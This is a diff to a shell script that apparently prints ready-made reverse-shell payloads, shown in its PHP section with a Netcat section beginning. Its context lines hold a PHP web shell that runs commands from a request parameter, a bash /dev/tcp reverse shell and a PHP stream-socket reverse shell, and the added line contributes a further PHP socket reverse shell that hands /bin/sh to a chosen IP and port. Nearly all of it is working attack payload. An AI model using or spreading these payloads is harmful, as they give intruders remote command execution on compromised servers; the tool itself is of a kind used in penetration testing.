@@ -29,6 +29,7 @@ elif [[ "$1" == "php" ]]; then
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php if(isset(\$_REQUEST[\"adda0a3d99480e6c29b065b1b0cd5319\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"adda0a3d99480e6c29b065b1b0cd5319\"]); system(\$cmd); echo \"</pre>\"; die; }?>"
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'\");"
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php \$s = stream_socket_client(\"tcp://$IP:$2\"); proc_open(\"/bin/sh -i\", [0=>\$s,1=>\$s,2=>\$s],\$pipes);?>"
+    echo -e "\t${YELLOW}-${ENDCOLOR} <?php \$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect(\$sock, \"$IP\", $2); \$fd = socket_export_stream(\$sock); proc_open(\"/bin/sh\", [0=>\$fd,1=>\$fd,2=>\$fd], \$pipes); ?>"
 
 elif [[ "$1" == "nc" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} Netcat reverse shell payloads generated:\n"
